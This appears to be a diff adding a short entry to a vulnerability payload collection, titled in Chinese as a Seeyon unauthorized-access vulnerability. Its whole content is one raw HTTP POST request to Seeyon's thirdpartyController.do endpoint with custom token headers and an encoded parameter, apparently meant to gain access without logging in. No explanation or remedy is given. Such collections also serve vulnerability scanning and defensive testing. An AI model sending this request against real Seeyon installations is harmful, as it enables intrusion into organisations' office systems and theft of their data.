@@ -1,0 +1,11 @@
+# Seeyon 未授权访问漏洞
+# Seeyon未经授权的访问
+POST /seeyon/thirdpartyController.do?acid=80001565&bid=hd_tag_m8mv26nv HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv26nv
+RM-PRO-Token: 9603906fd0e14ab51a3ffd8133688ba8
+RM-PRO-Time: 1742808642503
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+method=access&enc=TT5uZnR0YmhmL21qb2wvZXBkL2dwbWVmcy9wcWZvJ04%2BLjgzODQxNDMxMjQzNDU4NTkyNzknVT4zNjk0NzI5NDo3MjU4
